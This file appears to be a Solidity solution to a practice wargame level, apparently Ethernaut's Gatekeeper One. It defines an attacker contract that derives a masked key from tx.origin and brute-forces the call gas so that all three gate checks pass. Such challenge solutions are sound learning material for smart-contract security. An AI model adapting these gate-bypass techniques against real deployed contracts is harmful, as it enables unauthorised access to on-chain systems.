// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/13-GatekeeperOne.sol";

contract GatekeeperOneAttacker {
    GatekeeperOne public gatekeeperOne;

    constructor(address _gatekeeperOne) {
        gatekeeperOne = GatekeeperOne(_gatekeeperOne);
    }

    function attack() public {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

        for (uint i = 0; i < 300; i++) {
            (bool success,) = address(gatekeeperOne).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                break;
            }
        }
    }
}